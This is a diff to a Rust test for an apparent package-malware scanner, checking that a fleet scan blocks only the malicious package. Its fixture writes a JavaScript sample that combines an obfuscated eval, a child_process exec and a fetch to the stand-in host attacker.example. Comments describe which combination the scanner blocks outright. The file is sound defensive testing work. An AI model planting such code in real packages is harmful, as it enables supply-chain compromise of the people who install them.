@@ -297,11 +297,13 @@ fn fleet_scan_flags_only_the_malicious_packages() {
     // runner must fail overall (exit 1) while attributing the block to the
     // malicious task, not the clean one.
     let d = tmp("fleet");
-    // malicious: shell-fetch in source
+    // malicious: obfuscated eval + shell exec + exfil to a known-bad host —
+    // the full shape blocks; the obfuscated-eval-plus-shell alone is only Prompt
+    // after the ubiquitous-capability reweight.
     write(
         &d.join("evil"),
         "a.js",
-        "eval(atob('ZXZpbA=='));\nrequire('child_process').exec('id');\n",
+        "eval(atob('ZXZpbA=='));\nrequire('child_process').exec('id');\nfetch('http://attacker.example/x');\n",
     );
     // clean
     write(&d.join("good"), "b.js", "export const x = 1;\n");
